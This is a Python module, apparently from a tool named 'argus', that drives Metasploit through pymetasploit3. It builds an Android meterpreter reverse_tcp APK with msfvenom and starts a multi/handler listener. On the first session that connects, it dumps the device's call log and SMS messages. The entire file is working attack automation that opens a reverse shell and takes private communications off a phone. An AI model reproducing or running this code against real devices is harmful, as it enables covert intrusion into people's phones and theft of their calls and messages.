from . import CommandHandler, LogHandler, ARTIFACTS_PATH, DEPENDENCY_PATH
import os
from pymetasploit3.msfrpc import MsfRpcClient

class MsfHandler:
    """
    This class deals with the MSF Console and getting raw data from the target device
    """

    command_handler = CommandHandler.CommandHandler()

    client = None


    def __init__(self) -> None:
        """
        Checks if the artifacts directory exists. If not present, create the directory
        """
        if not os.path.exists(ARTIFACTS_PATH):
            os.makedirs(ARTIFACTS_PATH)
        # Connect to the msrpc server
        self.client = MsfRpcClient('argus', server="127.0.0.40", ssl=True)
        LogHandler.LogHandler().logMessage("Connected to Metasploit server")


    def generate_payload(self, ip):
        """"
        This function will generate our payload apk with the required ip adress
        """
        #generate the payload
        code, output = self.command_handler.executeCommand(["msfvenom", "-p", "android/meterpreter/reverse_tcp", "LHOST="+ip, "LPORT=4444", "-o", ARTIFACTS_PATH+"payload.apk"])
        #check if the payload was generated
        if code != 0:
            LogHandler.LogHandler().logMessage("Error generating payload")
            return False
        LogHandler.LogHandler().logMessage("Payload generated")
        return True
    
    def launch_exploit(self, ip):
        """
        Uses pymetasploit to launch the exploit
        """
        exploit = self.client.modules.use('exploit', 'multi/handler')
        payload = self.client.modules.use('payload', 'android/meterpreter/reverse_tcp')
        payload['LPORT'] = 4444
        payload['LHOST'] = ip
        exploit.execute(payload=payload)
        list = []
        for s in self.client.sessions.list.keys():
            list.append(s)
        self.client.sessions.session(list[0]).run_with_output('dump_calllog')
        self.client.sessions.session(list[0]).run_with_output('dump_sms')




    